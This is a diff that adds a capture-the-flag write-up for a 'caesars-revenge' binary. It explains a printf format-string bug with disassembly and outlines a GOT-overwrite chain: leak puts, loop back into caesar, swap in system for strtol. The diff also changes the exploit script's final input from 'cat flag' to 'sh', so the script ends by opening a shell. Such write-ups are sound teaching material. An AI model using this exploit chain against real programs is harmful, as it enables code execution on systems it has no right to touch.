@@ -218,6 +218,32 @@ int main()
 
 ## caesars-revenge
 
+The challenge binary is basically a ceasar cipher program which takes 250 bytes of input via `stdin` using `fgets`. A subsequent call to `fgets` allows the user to specify the shift or key of the caesar cipher.
+
+```assembly
+.text:00000000004011C4                 lea     rdi, format     ; "Enter text to be encoded: "
+.text:00000000004011CB                 mov     eax, 0
+.text:00000000004011D0                 call    _printf
+.text:00000000004011D5                 mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
+.text:00000000004011DC                 lea     rax, [rbp+s]
+.text:00000000004011E3                 mov     esi, 250        ; n
+.text:00000000004011E8                 mov     rdi, rax        ; s
+.text:00000000004011EB                 call    _fgets
+.text:00000000004011F0                 lea     rdi, aEnterNumberOfC ; "Enter number of characters to shift: "
+.text:00000000004011F7                 mov     eax, 0
+.text:00000000004011FC                 call    _printf
+.text:0000000000401201                 jmp     short loc_40126
+```
+
+At the bottom of the `caesar` function, we can see that `printf` is being called with our input as the format-string parameter, i.e. `printf(input)`, not `printf("%s\n", input)`. So we've got a format-string exploit. To bypass the caesar _encryption_ we'll just specify a shift/key of 26 characters.
+
+Cool, so now we're able to write and read memory. So our next step is to leak the address of `puts` in libc to bypass ASLR. We can do this by leaking the GOT entry of `puts` at `0x404018` using the `%28$s` format-string. The next step is to write the address of the `caesar` function into the `puts` GOT entry to redirect code execution back into the `caesar` function after `caesar` returns.
+
+So now that we've got the address of `puts` in libc, and we're onto our second execution of the `caesar` function. We can calculate the offset to `system` in libc from `puts`. We then write the address of `system` into `strtol`s GOT entry, resulting in the parameter passed to `strtol` being executed by `system`.
+
+The exploit is successful roughly 50% of the time. I'm guessing this is because I'm only writing the lower 16-bits of the address to `system`, and I'm pretty sure I'd need to write another 4 bits for it to be successful 100% of the time.
+
+
 ```python
 #!/usr/bin/python2
 
@@ -264,7 +290,7 @@ p.sendline(payload)
 p.sendline('-1')
 p.sendline('26')
 p.sendline('Hello')
-p.sendline('cat flag')
+p.sendline('sh')
 p.sendline('1')
 p.close()
 ```
